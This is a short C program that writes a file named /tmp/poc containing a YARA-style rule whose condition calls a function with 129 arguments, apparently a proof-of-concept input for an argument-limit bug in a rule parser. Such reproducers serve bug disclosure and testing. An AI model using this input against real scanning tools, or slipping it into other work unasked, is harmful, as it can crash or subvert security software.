#include <stdio.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    fprintf(f, "rule test { condition: f(");
    for (int i = 0; i < 129; i++) {
        fprintf(f, "%s%d", (i ? "," : ""), i);
    }
    fprintf(f, ") }");

    fclose(f);
    return 0;
}